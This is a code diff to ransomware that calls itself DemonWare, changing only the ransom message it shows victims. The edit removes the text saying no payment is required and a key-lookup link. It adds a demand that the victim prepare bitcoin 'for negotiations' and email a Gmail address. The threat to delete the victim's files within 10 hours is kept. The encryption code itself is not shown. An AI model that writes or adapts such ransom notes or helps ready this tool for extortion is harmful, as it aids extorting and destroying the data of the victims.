@@ -509,22 +509,16 @@ rar''')
 
         self.options['msg'].set('''Tango Down!
 
-Seems like you got hit by DemonWare ransomware!
+Your Computer has been Locked
 
 Don't Panic, you get have your files back!
 
-DemonWare uses a basic encryption script to lock your files.
-This type of ransomware is known as CRYPTO.
-You'll need a decryption key in order to unlock your files.
-
 Your files will be deleted when the timer runs out, so you better hurry.
-You have 10 hours to find your key
+You have 10 hours to get your key
 
-C'mon, be glad I don't ask for payment like other ransomware.
+You are adviced to get your bitcoins ready for negotiations
 
-Please visit: https://keys.zeznzo.nl and search for your IP/hostname to get your key.
-
-Kind regards,
+send us a mail to get your system back, o6847968@gmail.com
 
 Zeznzo
 ''')
